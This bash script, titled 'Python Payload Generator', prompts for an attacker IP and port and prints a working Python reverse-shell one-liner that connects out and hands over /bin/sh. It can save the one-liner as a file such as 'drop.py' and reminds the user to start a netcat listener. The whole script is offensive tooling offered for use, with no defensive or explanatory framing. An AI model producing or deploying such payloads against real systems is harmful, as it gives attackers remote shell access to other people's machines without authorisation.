#!/bin/bash

echo "=== Python Payload Generator ==="
read -p "Your IP (LHOST): " LHOST
read -p "Your Port (LPORT): " LPORT
read -p "Save to file? (y/n): " SAVE

# Python Reverse Shell (Python 2/3 compatible)
PAYLOAD="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"

echo ""
echo "[+] Payload:"
echo "$PAYLOAD"

if [[ "$SAVE" == "y" || "$SAVE" == "Y" ]]; then
    read -p "Filename to save as (e.g., drop.py): " FILENAME
    echo "$PAYLOAD" > "$FILENAME"
    echo "[✓] Saved to $FILENAME"
fi

echo ""
echo "[!] Ensure your listener is running:"
echo "    nc -lvnp $LPORT"
